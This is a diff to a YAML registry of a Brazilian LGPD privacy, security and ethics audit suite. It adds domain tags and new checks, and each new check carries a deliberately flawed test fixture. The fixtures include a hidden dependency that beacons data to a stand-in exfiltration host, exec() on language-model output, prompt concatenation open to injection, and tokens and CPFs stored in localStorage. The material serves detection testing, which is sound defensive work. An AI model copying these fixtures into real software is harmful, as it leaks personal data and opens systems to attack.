@@ -11,6 +11,17 @@
 #   previsto-fase-2   — Trabalho A (runtime), roadmap Fase 2
 #   previsto-fase-3   — roadmap Fase 3
 #
+# `domain` e a segunda dimensao: o ESTRATO TECNICO que o check examina
+# (frontend | api | backend | data | ai). Pode ser lista — S-07 olha a borda
+# e a trilha, entao vale para api e backend.
+#
+# Pilar e dominio sao ortogonais de proposito. O pilar responde "que valor
+# esta em jogo" (privacidade, seguranca, etica); o dominio responde "onde
+# isso se manifesta no sistema". Um consumidor de time de frontend quer
+# `--domain frontend` sem deixar de ser auditado nos tres pilares; um DPO
+# quer `--pilar privacy` atravessando todos os estratos. A matriz serve aos
+# dois sem duplicar check nenhum.
+#
 # `modo` diz onde o check pode rodar (contrato de autorizacao, COMO-ADOTAR §5):
 #   inventory — Trabalho B, sem rede, agente pode disparar
 #   passive   — Trabalho A somente-leitura, com a propria identidade
@@ -23,6 +34,7 @@ checks:
   # -------------------------------------------------- Pacote P — Privacidade
   P-01:
     pack: privacy
+    domain: [backend]
     titulo: PII em logs/prints sem mascaramento
     base_legal: LGPD Art. 46
     tipo: estatico
@@ -42,6 +54,7 @@ checks:
       espera_severidade: CRITICO
   P-02:
     pack: privacy
+    domain: [data]
     titulo: Retencao declarada sem job de purga
     base_legal: LGPD Art. 15-16
     tipo: estatico
@@ -66,6 +79,7 @@ checks:
       espera_severidade: ALTO
   P-03:
     pack: privacy
+    domain: [data]
     titulo: Soft-delete sem eliminacao fisica / crypto-shredding
     base_legal: LGPD Art. 18 VI
     tipo: estatico
@@ -81,6 +95,7 @@ checks:
       espera_severidade: ALTO
   P-04:
     pack: privacy
+    domain: [data]
     titulo: Catalogo vivo de dados
     base_legal: LGPD Art. 37
     tipo: estatico
@@ -102,6 +117,7 @@ checks:
       espera_severidade: MEDIO
   P-05:
     pack: privacy
+    domain: [api]
     titulo: Minimizacao por jornada — DTO rejeita campo fora da allowlist
     base_legal: LGPD Art. 6o III
     tipo: estatico+runtime
@@ -121,6 +137,7 @@ checks:
       espera_severidade: ALTO
   P-06:
     pack: privacy
+    domain: [backend]
     titulo: Pseudonimizacao com chave segregada
     base_legal: LGPD Art. 46
     tipo: estatico
@@ -135,6 +152,7 @@ checks:
       espera_severidade: CRITICO
   P-07:
     pack: privacy
+    domain: [api, data]
     titulo: Consentimento granular por finalidade, opt-in, com registro
     base_legal: LGPD Art. 7o-8o
     tipo: estatico+runtime
@@ -154,6 +172,7 @@ checks:
       espera_severidade: CRITICO
   P-08:
     pack: privacy
+    domain: [data]
     titulo: Dado sensivel nunca com base legal legitimo interesse
     base_legal: LGPD Art. 11
     tipo: estatico
@@ -178,6 +197,7 @@ checks:
       espera_severidade: CRITICO
   P-09:
     pack: privacy
+    domain: [data, api]
     titulo: k-anonimato em agregacoes de BI
     base_legal: reidentificacao
     tipo: estatico+runtime
@@ -197,6 +217,7 @@ checks:
       espera_severidade: ALTO
   P-10:
     pack: privacy
+    domain: [api]
     titulo: Portabilidade — endpoint de exportacao existe e responde
     base_legal: LGPD Art. 18 V
     tipo: runtime
@@ -216,6 +237,7 @@ checks:
       espera_severidade: ALTO
   P-11:
     pack: privacy
+    domain: [api]
     titulo: Oraculo de existencia — 403 vs 404 distinguivel
     base_legal: profiling
     tipo: estatico+runtime
@@ -241,6 +263,7 @@ checks:
   # -------------------------------------------------- Pacote S — Seguranca
   S-01:
     pack: security
+    domain: [api]
     titulo: BOLA/IDOR — recurso de titular sem assertOwnership
     base_legal: OWASP API1
     tipo: estatico+runtime
@@ -260,6 +283,7 @@ checks:
       espera_severidade: CRITICO
   S-02:
     pack: security
+    domain: [api]
     titulo: Rate limit + paginacao por cursor (anti-extracao em massa)
     base_legal: OWASP API4
     tipo: runtime
@@ -279,6 +303,7 @@ checks:
       espera_severidade: ALTO
   S-03:
     pack: security
+    domain: [api]
     titulo: Erros e webhooks sem PII no payload
     base_legal: LGPD Art. 46
     tipo: estatico+runtime
@@ -298,6 +323,7 @@ checks:
       espera_severidade: ALTO
   S-04:
     pack: security
+    domain: [backend]
     titulo: Manifesto de terceiros — host externo registrado com DPA
     base_legal: LGPD Art. 39
     tipo: estatico
@@ -316,6 +342,7 @@ checks:
       espera_severidade: ALTO
   S-05:
     pack: security
+    domain: [backend, data]
     titulo: Payload minimo de egresso — schema por destino, PII proibida
     base_legal: LGPD Art. 6o III
     tipo: estatico+runtime
@@ -335,6 +362,7 @@ checks:
       espera_severidade: ALTO
   S-06:
     pack: security
+    domain: [backend]
     titulo: Chave por parceiro — nenhuma API key global/hardcoded
     base_legal: LGPD Art. 46
     tipo: estatico
@@ -349,6 +377,7 @@ checks:
       espera_severidade: CRITICO
   S-07:
     pack: security
+    domain: [api, backend]
     titulo: Propagacao de finalidade (X-Purpose) + log de auditoria estruturado
     base_legal: LGPD Art. 37
     tipo: estatico+runtime
@@ -369,6 +398,7 @@ checks:
       espera_severidade: ALTO
   S-08:
     pack: security
+    domain: [data, backend]
     titulo: Transferencia internacional exige base declarada no manifesto
     base_legal: LGPD Art. 33
     tipo: estatico
@@ -391,6 +421,7 @@ checks:
   # -------------------------------------------------- Pacote E — Etica
   E-00:
     pack: ethics
+    domain: [ai]
     titulo: Escopo do pack de etica (guarda) — ha decisao automatizada sobre pessoas?
     base_legal: EbD-AI
     tipo: estatico
@@ -410,6 +441,7 @@ checks:
       espera_severidade: ALTO
   E-01:
     pack: ethics
+    domain: [ai, api]
     titulo: Decisao automatizada sem explicacao (motivo/fatores/reason_code)
     base_legal: LGPD Art. 20
     tipo: estatico+runtime
@@ -429,6 +461,7 @@ checks:
       espera_severidade: ALTO
   E-02:
     pack: ethics
+    domain: [ai, backend]
     titulo: Decision log estruturado (modelo_v, features, score, limiar, revisor)
     base_legal: LGPD Art. 20/37
     tipo: estatico+runtime
@@ -448,6 +481,7 @@ checks:
       espera_severidade: ALTO
   E-03:
     pack: ethics
+    domain: [api]
     titulo: Contestacao — endpoint de recurso com protocolo e SLA
     base_legal: LGPD Art. 18
     tipo: runtime
@@ -467,6 +501,7 @@ checks:
       espera_severidade: ALTO
   E-04:
     pack: ethics
+    domain: [ai, backend]
     titulo: HITL — decisoes criticas com rota de revisao humana
     base_legal: LGPD Art. 20 §3
     tipo: estatico
@@ -486,6 +521,7 @@ checks:
       espera_severidade: CRITICO
   E-05:
     pack: ethics
+    domain: [ai]
     titulo: Proxy de discriminacao — feature proibida no pipeline
     base_legal: LGPD Art. 6o IX
     tipo: estatico
@@ -503,6 +539,7 @@ checks:
       espera_severidade: ALTO
   E-06:
     pack: ethics
+    domain: [ai, data]
     titulo: Drift de disparidade — DPD por grupo vs baseline
     base_legal: nao-discriminacao
     tipo: ci
@@ -521,6 +558,7 @@ checks:
       espera_severidade: ALTO
   E-07:
     pack: ethics
+    domain: [ai]
     titulo: Model Card + Datasheet presentes, versionados e validos
     base_legal: EbD-AI / LGPD Art. 20
     tipo: estatico
@@ -539,14 +577,36 @@ checks:
       espera_severidade: ALTO
   E-08:
     pack: ethics
+    domain: [data]
     titulo: Provenance/lineage — origem, transformacao e destino rastreaveis
-    base_legal: rastreabilidade
+    base_legal: rastreabilidade (LGPD Art. 37)
     tipo: estatico
     modo: inventory
     fase: 3
-    status: previsto-fase-3
+    supports: [P-04, S-04, E-12]
+    status: implementado
+    canonical_mutation:
+      descricao: catalogo com dado pessoal e nenhuma trilha de proveniencia
+      arquivos:
+        catalog.yaml: |
+          tables:
+            clientes:
+              fields:
+                cpf:
+                  class: personal
+                  owner: financeiro
+                  purpose: cobranca
+                  legal_basis: contrato
+                  retention_years: 5
+        README.md: |
+          # Governanca
+          Temos rastreabilidade de lineage completa e auditavel.
+      config:
+        catalog_path: catalog.yaml
+      espera_severidade: ALTO
   E-09:
     pack: ethics
+    domain: [ai, api]
     titulo: Kill switch / modo degradado digno, documentado e testavel
     base_legal: controle humano
     tipo: runtime
@@ -566,6 +626,7 @@ checks:
       espera_severidade: ALTO
   E-10:
     pack: ethics
+    domain: [ai]
     titulo: Incerteza quantificada em decisoes pontuais
     base_legal: robustez
     tipo: estatico
@@ -579,3 +640,714 @@ checks:
           def decidir(modelo, x):
               return modelo.predict(x)
       espera_severidade: MEDIO
+
+  # --- IA e cadeia de terceiros (E-11..E-13) -------------------------------
+  # Ficam no pack `ethics` porque o prefixo do ID fixa o pack, e o ID foi
+  # ratificado como E-*. Na regra de fronteira do plano v1 (§2, "o check mora
+  # no submodulo cujo OBJETO ele examina") E-11 tenderia a privacy e E-13 a
+  # security; a coesao do prefixo venceu, e o `supports` abaixo registra o
+  # parentesco para que a sobreposicao seja referencia cruzada, nunca duplicacao.
+  # E-11 entra no conjunto CRITICO (fail-closed), ratificado no pedido.
+  E-11:
+    pack: ethics
+    domain: [ai, backend]
+    titulo: PII em prompt de LLM sem redacao
+    base_legal: LGPD Art. 46 + Art. 42 (responsabilidade solidaria)
+    tipo: estatico
+    modo: inventory
+    fase: 4
+    status: implementado
+    supports: [P-01, S-04]
+    canonical_mutation:
+      descricao: dado pessoal interpolado cru em chamada a modelo de linguagem
+      arquivos:
+        a.py: |
+          import llm
+
+
+          def resumir(user):
+              # TODO: redact algum dia
+              return llm.complete(f"cliente {user.cpf} reclamou")
+      espera_severidade: CRITICO
+  E-12:
+    pack: ethics
+    domain: [ai, data]
+    titulo: Embedding/hash exportado como se fosse anonimo
+    base_legal: LGPD Art. 12 + Art. 42 (responsabilidade solidaria)
+    tipo: estatico
+    modo: inventory
+    fase: 4
+    status: implementado
+    supports: [P-04, S-05]
+    canonical_mutation:
+      descricao: derivado exportado com campo de origem ausente do catalogo
+      arquivos:
+        a.py: |
+          def indexar(u):
+              embedding_do_usuario = modelo.encode(u.nome_completo)
+              broker.send(embedding_do_usuario)
+        catalog.yaml: |
+          tables:
+            contratos:
+              fields:
+                valor:
+                  class: anonymized
+                  owner: financeiro
+                  purpose: relatorio
+                  legal_basis: contrato
+                  retention_years: 5
+      config:
+        catalog_path: catalog.yaml
+      espera_severidade: ALTO
+  E-13:
+    pack: ethics
+    domain: [backend]
+    titulo: Dependencia com host nao declarado no manifesto
+    base_legal: LGPD Art. 39 + Art. 42 (responsabilidade solidaria)
+    tipo: estatico
+    modo: inventory
+    fase: 4
+    status: implementado
+    supports: [S-04, S-08]
+    canonical_mutation:
+      descricao: host dentro de node_modules ausente do manifesto de terceiros
+      arquivos:
+        node_modules/rastreador/index.js: |
+          export function t(e) {
+            navigator.sendBeacon("https://telemetria.exfil.example.net/c", e);
+          }
+        tp.yml: |
+          integrations:
+            - name: outro
+              hosts: [api.outro.example.net]
+              dpa_signed: true
+              egress_fields: [id_pseudonimo]
+      config:
+        third_party_manifest: tp.yml
+      espera_severidade: ALTO
+
+  # --- Dominio FRONTEND (FE-*) --------------------------------------------
+  # Primeiro estrato onde o ID codifica o DOMINIO, nao o pilar: cada FE-*
+  # declara `pack` explicitamente. Ver ressalva de nomenclatura no relatorio.
+  # Os tres nascem sobre AST real (tree-sitter); o grep do material de
+  # fundacao serve para achar ONDE olhar, jamais como check (D-01).
+  P-13:
+    pack: privacy
+    domain: [frontend]
+    titulo: Controle de consentimento pre-marcado
+    base_legal: LGPD Art. 7o V e Art. 8o §1o (consentimento inequivoco)
+    tipo: estatico
+    modo: inventory
+    fase: 5
+    status: implementado
+    supports: [P-07]
+    canonical_mutation:
+      descricao: checkbox de consentimento com checked literal e sem handler
+      arquivos:
+        C.jsx: |
+          export const C = () => (
+            <label>
+              Aceito receber marketing
+              <input type="checkbox" name="consent_ads" checked />
+            </label>
+          );
+      espera_severidade: CRITICO
+  P-14:
+    pack: privacy
+    domain: [frontend]
+    titulo: PII no armazenamento do cliente ou na URL
+    base_legal: LGPD Art. 46 + Art. 6o VII (seguranca e prevencao)
+    tipo: estatico
+    modo: inventory
+    fase: 5
+    status: implementado
+    supports: [P-01, P-06]
+    canonical_mutation:
+      descricao: CPF gravado no localStorage e e-mail montado em query string
+      arquivos:
+        a.js: |
+          export function salvar(user) {
+            localStorage.setItem("cpf", user.cpf);
+            return fetch("/r?email=" + user.email);
+          }
+      espera_severidade: CRITICO
+  S-09:
+    pack: security
+    domain: [frontend]
+    titulo: Token sensivel persistido no cliente
+    base_legal: LGPD Art. 46 (seguranca) + OWASP A07
+    tipo: estatico
+    modo: inventory
+    fase: 5
+    status: implementado
+    supports: [S-06, E-13]
+    canonical_mutation:
+      descricao: token de sessao guardado no localStorage
+      arquivos:
+        a.js: |
+          export function login(jwt) {
+            localStorage.setItem("token", jwt);
+          }
+      espera_severidade: ALTO
+
+  # --- Dominio AI: os dois buracos que a matriz expos -----------------------
+  # security x ai estava VAZIO e privacy x ai existia so de rabo de olho, via
+  # ethics. Estes quatro nasceram olhando o estrato — nao sao etiquetagem a
+  # posteriori, que foi a leitura critica da matriz sobre api/backend/data.
+  S-10:
+    pack: security
+    domain: [ai]
+    titulo: Injecao de prompt (instrucao, invisivel, flooding)
+    base_legal: LGPD Art. 46 (seguranca) + OWASP LLM01
+    tipo: estatico
+    modo: inventory
+    fase: 6
+    status: implementado
+    supports: [E-11, S-11]
+    canonical_mutation:
+      descricao: entrada do usuario concatenada no prompt sem tratamento
+      arquivos:
+        a.py: |
+          import llm
+          from flask import request
+
+
+          def f():
+              return llm.complete("resuma: " + request.body)
+      espera_severidade: CRITICO
+  S-11:
+    pack: security
+    domain: [ai]
+    titulo: Saida do modelo em sink perigoso sem validacao
+    base_legal: LGPD Art. 46 (seguranca) + OWASP LLM02
+    tipo: estatico
+    modo: inventory
+    fase: 6
+    status: implementado
+    supports: [S-10]
+    canonical_mutation:
+      descricao: resposta do modelo executada sem validacao
+      arquivos:
+        a.py: |
+          import llm
+
+
+          def f(p):
+              exec(llm.complete(p))
+      espera_severidade: CRITICO
+  P-15:
+    pack: privacy
+    domain: [ai]
+    titulo: Dado pessoal como feature de treino sem finalidade declarada
+    base_legal: LGPD Art. 6o I e III (finalidade e necessidade)
+    tipo: estatico
+    modo: inventory
+    fase: 6
+    status: implementado
+    supports: [P-04, P-08, E-06]
+    # Severidade CONDICIONAL (ratificada): campo sensivel -> CRITICO (Art. 11
+    # e trava estrutural, mesmo principio de P-08); pessoal comum -> ALTO.
+    # A mutacao canonica prova a violacao MINIMA, que e o ramo ALTO; o ramo
+    # CRITICO tem prova propria em tests/test_ia_estrato.py.
+    canonical_mutation:
+      descricao: CPF vira feature de treino com finalidade de cobranca no catalogo
+      arquivos:
+        a.py: |
+          def treinar(df, modelo):
+              modelo.fit(df[["cpf"]], df["y"])
+        catalog.yaml: |
+          tables:
+            clientes:
+              fields:
+                cpf:
+                  class: personal
+                  owner: financeiro
+                  purpose: cobranca
+                  legal_basis: contrato
+                  retention_years: 5
+      config:
+        catalog_path: catalog.yaml
+      espera_severidade: ALTO
+  P-16:
+    pack: privacy
+    domain: [ai]
+    titulo: Dataset de treino sem governanca declarada
+    base_legal: LGPD Art. 6o I e V + Art. 16 (finalidade, qualidade e eliminacao)
+    tipo: estatico
+    modo: inventory
+    fase: 6
+    status: implementado
+    supports: [E-08, P-02]
+    canonical_mutation:
+      descricao: dataset carregado para treino sem entrada em `datasets`
+      arquivos:
+        a.py: |
+          import pandas as pd
+
+
+          def treinar(modelo):
+              df = pd.read_csv("dados/base_clientes.csv")
+              modelo.fit(df, df["y"])
+        catalog.yaml: |
+          tables: {}
+      config:
+        catalog_path: catalog.yaml
+      espera_severidade: ALTO
+
+
+  # ================================================================ fase 7
+  # Pacote fundador do estrato de API. A matriz de v0.7.0 mostrou `api` com
+  # 12 checks e nenhum nascido olhando para ele: vieram do Trabalho A e do
+  # inventario e foram etiquetados depois. Densidade por heranca nao e
+  # cobertura. Estes tres nascem da pergunta "o que e proprio de uma borda
+  # de API?" — o contrato, o filtro de busca e o payload de erro.
+  S-12:
+    pack: security
+    domain: [api]
+    titulo: Ontologia x-ethics ausente ou nao implementada no contrato
+    base_legal: LGPD Art. 6o VI (transparencia) + Art. 46 (seguranca)
+    tipo: estatico
+    modo: inventory
+    fase: 7
+    status: implementado
+    supports: [P-04, S-03, P-17]
+    canonical_mutation:
+      descricao: schema OpenAPI expoe CPF e nao declara ontologia x-ethics
+      arquivos:
+        openapi.yaml: |
+          openapi: 3.0.3
+          components:
+            schemas:
+              Cliente:
+                type: object
+                properties:
+                  id: {type: string}
+                  cpf: {type: string}
+      espera_severidade: ALTO
+  P-17:
+    pack: privacy
+    domain: [api]
+    titulo: Endpoint de busca aceita filtro sensivel sem bloqueio
+    base_legal: LGPD Art. 6o IX + Art. 11 (nao discriminacao)
+    tipo: estatico
+    modo: inventory
+    fase: 7
+    status: implementado
+    supports: [E-05, S-12]
+    canonical_mutation:
+      descricao: rota de busca aceita ?raca= sem allowlist de filtros
+      arquivos:
+        rotas.py: |
+          from flask import request
+
+
+          @app.get("/clientes")
+          def buscar():
+              return repo.buscar(raca=request.args.get("raca"))
+      espera_severidade: ALTO
+  S-13:
+    pack: security
+    domain: [api]
+    titulo: Resposta de erro expoe pilha, caminho ou versao interna
+    base_legal: LGPD Art. 46 (seguranca) + Art. 6o VIII (prevencao)
+    tipo: estatico
+    modo: inventory
+    fase: 7
+    status: implementado
+    supports: [S-03]
+    canonical_mutation:
+      descricao: handler de erro devolve traceback ao cliente
+      arquivos:
+        erros.py: |
+          import traceback
+
+          from flask import jsonify
+
+
+          @app.errorhandler(500)
+          def falha(e):
+              return jsonify({"trace": traceback.format_exc()}), 500
+      espera_severidade: ALTO
+
+  # ================================================================ fase 8
+  # Pacote fundador do estrato de backend. Mesmo diagnostico que a matriz
+  # fez sobre `api`: 11 checks, todos herdados do inventario. O que e
+  # proprio do backend nao e "codigo de servidor" — e a INFRA que so existe
+  # deste lado: o dump que viaja entre ambientes, a role do banco, a coluna
+  # cifrada, o topico imutavel e a regiao onde o byte pousa.
+  S-14:
+    pack: security
+    domain: [backend]
+    titulo: Dump de producao restaurado em ambiente inferior sem descaracterizar
+    base_legal: LGPD Art. 46 (seguranca) + Art. 6o VIII (prevencao)
+    tipo: estatico
+    modo: inventory
+    fase: 8
+    status: implementado
+    supports: [P-06, S-15]
+    canonical_mutation:
+      descricao: dump de producao restaurado em staging sem pseudonimizacao
+      arquivos:
+        refresh.sh: |
+          pg_dump "$PROD_DATABASE_URL" > dump_prod.sql
+          psql "$STAGING_DATABASE_URL" < dump_prod.sql
+      espera_severidade: ALTO
+  S-15:
+    pack: security
+    domain: [backend, data]
+    titulo: Role de banco com privilegio excessivo
+    base_legal: LGPD Art. 46 + Art. 6o III (minimizacao)
+    tipo: estatico
+    modo: inventory
+    fase: 8
+    status: implementado
+    supports: [P-04, S-14]
+    canonical_mutation:
+      descricao: GRANT SELECT ON ALL TABLES em vez de concessao por coluna
+      arquivos:
+        migracao.sql: |
+          GRANT SELECT ON ALL TABLES IN SCHEMA public TO app_readonly;
+      espera_severidade: ALTO
+  P-18:
+    pack: privacy
+    domain: [backend, data]
+    titulo: Campo sensivel persistido sem cifra de aplicacao com chave gerenciada
+    base_legal: LGPD Art. 46 + Art. 11 (dado sensivel)
+    tipo: estatico
+    modo: inventory
+    fase: 8
+    status: implementado
+    supports: [P-06, P-04, S-15]
+    canonical_mutation:
+      descricao: campo sensivel no catalogo sem cifra nem gerencia de chave
+      arquivos:
+        catalog.yaml: |
+          tables:
+            users:
+              fields:
+                biometria:
+                  class: sensitive
+                  owner: seguranca
+                  purpose: autenticacao
+                  legal_basis: consentimento
+                  retention_years: 1
+      config:
+        catalog_path: catalog.yaml
+      espera_severidade: ALTO
+  P-19:
+    pack: privacy
+    domain: [backend, data]
+    titulo: Log de eventos com PII sem crypto-shredding
+    base_legal: LGPD Art. 18 VI (eliminacao) + Art. 16
+    tipo: estatico
+    modo: inventory
+    fase: 8
+    status: implementado
+    supports: [P-03, E-08]
+    canonical_mutation:
+      descricao: CPF publicado em topico append-only sem chave por titular
+      arquivos:
+        eventos.py: |
+          from kafka import KafkaProducer
+
+          producer = KafkaProducer()
+
+
+          def f(cliente):
+              producer.send("clientes", {"cpf": cliente.cpf})
+      espera_severidade: ALTO
+  S-16:
+    pack: security
+    domain: [backend]
+    titulo: Persistencia fora da residencia de dados declarada
+    base_legal: LGPD Art. 33 (transferencia internacional)
+    tipo: estatico
+    modo: inventory
+    fase: 8
+    status: implementado
+    supports: [S-08]
+    canonical_mutation:
+      descricao: politica declara BR e a escrita vai para regiao dos EUA
+      arquivos:
+        persistencia.py: |
+          import boto3
+
+          s3 = boto3.client("s3", region_name="us-east-1")
+      config:
+        data_residency: BR
+      espera_severidade: ALTO
+
+  # ================================================================ fase 9
+  # Fundador do estrato `data`. Aqui a densidade nao era heranca preguicosa:
+  # `data` foi o estrato ONDE A SUITE COMECOU — catalogo, retencao,
+  # k-anonimato e lineage nasceram olhando para ele. Sobrou um buraco, e ele
+  # e perigoso justamente por parecer resolvido.
+  #
+  # P-21 (zona bruta de data lake sem restricao) foi INVESTIGADO e NAO
+  # implementado: a leitura assinada esta em pse/matriz.py
+  # (FORA_DE_ESCOPO_ESTATICO) e em tests/test_data_estrato.py. Buraco honesto
+  # e melhor que check que nao verifica nada real.
+  P-20:
+    pack: privacy
+    domain: [data]
+    titulo: Hash determinístico sem chave tratado como anonimizacao
+    base_legal: LGPD Art. 12 (dado anonimizado) + Art. 6o
+    tipo: estatico
+    modo: inventory
+    fase: 9
+    status: implementado
+    supports: [P-06, P-09, P-18, E-12]
+    # Severidade CONDICIONAL, mesmo principio ratificado em P-15: campo
+    # sensivel -> CRITICO, pessoal comum -> ALTO. A mutacao prova o ramo
+    # ALTO, que e a violacao minima; o ramo CRITICO tem prova propria.
+    canonical_mutation:
+      descricao: sha256 nu de CPF gravado em coluna declarada anonima
+      arquivos:
+        exportacao.py: |
+          import hashlib
+
+
+          def exportar(cliente, warehouse):
+              h = hashlib.sha256(cliente.cpf.encode()).hexdigest()
+              warehouse.insert("dim_cliente", {"id_anonimo": h})
+        catalog.yaml: |
+          tables:
+            clientes:
+              fields:
+                cpf:
+                  class: personal
+                  owner: cadastro
+                  purpose: identificacao
+                  legal_basis: contrato
+                  retention_years: 5
+      config:
+        catalog_path: catalog.yaml
+      espera_severidade: ALTO
+
+  # ================================================================ fase 10
+  # CAMADA DINAMICA — Trabalho A por navegador. Os tres fundadores sao
+  # PASSIVOS: carregam a pagina e observam. Clicar banner e submeter
+  # formulario escrevem no sistema do alvo e ficam para depois, atras do
+  # gate ativo. Na duvida entre passivo e ativo, ativo.
+  #
+  # `status: implementado` e `modo: passive` seguem o padrao ratificado dos
+  # runtime existentes (S-01, P-05, ...): o check EXISTE; sem `target`
+  # declarado ele aparece em `checks_nao_habilitados` com motivo. Marca-lo
+  # `previsto-*` diria que nao foi escrito, o que seria falso.
+  #
+  # P-21 nao existe e nao vai existir: e a decisao assinada de fora-de-escopo
+  # estatico (zona bruta de data lake). A numeracao salta para preservar o
+  # registro — reaproveitar o ID apagaria a decisao.
+  P-22:
+    pack: privacy
+    domain: [frontend]
+    titulo: Rastreador ou cookie nao essencial antes de qualquer consentimento
+    base_legal: LGPD Art. 7o I e Art. 8o (consentimento previo e especifico)
+    tipo: runtime
+    modo: passive
+    fase: 10
+    status: implementado
+    supports: [P-13, S-04, E-13]
+    canonical_mutation:
+      descricao: tag de analytics dispara no primeiro load, antes de qualquer aceite
+      navegador:
+        url: https://alvo.example.org/
+        requisicoes:
+          - url: https://alvo.example.org/
+            tipo: document
+          - url: https://www.google-analytics.com/collect?v=2
+            tipo: script
+        cookies:
+          - name: _ga
+            httpOnly: false
+            secure: false
+            sameSite: Lax
+      espera_severidade: ALTO
+  S-17:
+    pack: security
+    domain: [frontend]
+    titulo: Cookie de sessao sem HttpOnly, Secure ou SameSite
+    base_legal: LGPD Art. 46 (seguranca) + OWASP A05
+    tipo: runtime
+    modo: passive
+    fase: 10
+    status: implementado
+    supports: [S-09]
+    canonical_mutation:
+      descricao: cookie de sessao entregue sem atributo de protecao nenhum
+      navegador:
+        url: https://alvo.example.org/
+        cookies:
+          - name: sessionid
+            httpOnly: false
+            secure: false
+            sameSite: ""
+      espera_severidade: ALTO
+  P-23:
+    pack: privacy
+    domain: [frontend]
+    titulo: PII em transito na URL, no formulario GET ou no Referer
+    base_legal: LGPD Art. 46 + Art. 6o VII (seguranca e prevencao)
+    tipo: runtime
+    modo: passive
+    fase: 10
+    status: implementado
+    supports: [P-14, S-03]
+    canonical_mutation:
+      descricao: link publica CPF na query string da propria pagina
+      navegador:
+        url: https://alvo.example.org/
+        html: |
+          <html><body>
+          <a href="/fatura?cpf=529.982.247-25">fatura</a>
+          </body></html>
+      espera_severidade: ALTO
+
+  # ================================================================ fase 11
+  # Camada dinamica, FASE 2 — o resto do passivo de seguranca/LGPD portado
+  # da qa-suite. Todos observam o que o navegador JA baixou: nenhum pede ao
+  # servidor um recurso que ele nao ofereceu, porque isso e sondagem, e
+  # sondagem e Fase 3, atras do gate ativo.
+  S-18:
+    pack: security
+    domain: [frontend]
+    titulo: Terceiro observado no carregamento fora do manifesto
+    base_legal: LGPD Art. 37 e 39 (registro e operador) + Art. 42
+    tipo: runtime
+    modo: passive
+    fase: 11
+    status: implementado
+    supports: [S-04, P-22]
+    canonical_mutation:
+      descricao: host de terceiro contactado no load sem constar do manifesto
+      arquivos:
+        tp.yml: |
+          integrations:
+            - name: outro-parceiro
+              hosts: [api.declarado.example.org]
+              dpa_signed: true
+      config:
+        third_party_manifest: tp.yml
+      navegador:
+        url: https://alvo.example.org/
+        requisicoes:
+          - url: https://alvo.example.org/
+            tipo: document
+          - url: https://cdn.terceiro.example.net/widget.js
+            tipo: script
+      espera_severidade: ALTO
+  S-19:
+    pack: security
+    domain: [frontend]
+    titulo: Documento sem cabecalho de seguranca, ou com mixed content
+    base_legal: LGPD Art. 46 (seguranca) + Art. 6o VIII (prevencao)
+    tipo: runtime
+    modo: passive
+    fase: 11
+    status: implementado
+    supports: [S-13]
+    canonical_mutation:
+      descricao: documento servido sem CSP nem nosniff
+      navegador:
+        url: https://alvo.example.org/
+        recursos:
+          - url: https://alvo.example.org/
+            status: 200
+            tipo: text/html
+            da_origem: true
+      espera_severidade: ALTO
+  S-20:
+    pack: security
+    domain: [frontend]
+    titulo: Credencial servida ao cliente em JS ou JSON de origem
+    base_legal: LGPD Art. 46 (seguranca)
+    tipo: runtime
+    modo: passive
+    fase: 11
+    status: implementado
+    supports: [P-06, S-06]
+    canonical_mutation:
+      descricao: chave de AWS publicada no bundle do proprio alvo
+      navegador:
+        url: https://alvo.example.org/
+        recursos:
+          - url: https://alvo.example.org/app.js
+            status: 200
+            tipo: application/javascript
+            da_origem: true
+            corpo: 'var cfg = {key: "AKIAIOSFODNN7EXAMPLE"};'
+      espera_severidade: CRITICO
+  P-24:
+    pack: privacy
+    domain: [frontend]
+    titulo: Metadado de localizacao ou autoria em arquivo publicado
+    base_legal: LGPD Art. 5o I + Art. 6o III (minimizacao)
+    tipo: runtime
+    modo: passive
+    fase: 11
+    status: implementado
+    supports: [P-23, P-14]
+    canonical_mutation:
+      descricao: imagem publicada com IFD de GPS no EXIF
+      navegador:
+        url: https://alvo.example.org/
+        recursos:
+          - url: https://alvo.example.org/foto.jpg
+            status: 200
+            tipo: image/jpeg
+            da_origem: true
+            corpo_jpeg_com_gps: true
+      espera_severidade: ALTO
+  S-21:
+    pack: security
+    domain: [frontend]
+    titulo: Bundle referencia sourcemap em producao
+    base_legal: LGPD Art. 46 (seguranca)
+    tipo: runtime
+    modo: passive
+    fase: 11
+    status: implementado
+    supports: [S-20]
+    canonical_mutation:
+      descricao: bundle declara sourceMappingURL na resposta servida
+      navegador:
+        url: https://alvo.example.org/
+        recursos:
+          - url: https://alvo.example.org/app.js
+            status: 200
+            tipo: application/javascript
+            da_origem: true
+            corpo: "//# sourceMappingURL=app.js.map"
+      espera_severidade: MEDIO
+  # -------------------------------------------------- Fase 12 — o unico check
+  # que sobreviveu a avaliacao de seis materiais de security. Os demais vetores
+  # ja tinham dono (BOLA -> S-01, minimizacao -> P-05, hash -> P-20,
+  # DPA -> S-04, dado de treino -> P-15). Convergencia e resultado, nao falha.
+  S-22:
+    pack: security
+    domain: [api]
+    titulo: Finalidade sem base legal amarrada e sem recusa da combinacao invalida
+    base_legal: LGPD Art. 6o I (finalidade) + Art. 7o (base legal)
+    tipo: estatico+runtime
+    modo: active
+    fase: 12
+    status: implementado
+    # S-07 responde "o sistema sabe PARA QUE o dado foi lido?" (Art. 37).
+    # S-22 responde "aquela finalidade podia rodar sob aquela base?" (Art. 6o).
+    # Um sistema passa o primeiro e falha o segundo — e o caso comum.
+    supports: [S-07]
+    canonical_mutation:
+      descricao: finalidade lida da requisicao sem mapa finalidade -> base legal
+      arquivos:
+        app.py: |
+          from flask import Flask, request
+
+          app = Flask(__name__)
+
+
+          @app.get("/clientes")
+          def listar():
+              finalidade = request.headers.get("X-Purpose")
+              auditoria.registrar(purpose=finalidade)
+              return repositorio.listar()
+      espera_severidade: ALTO
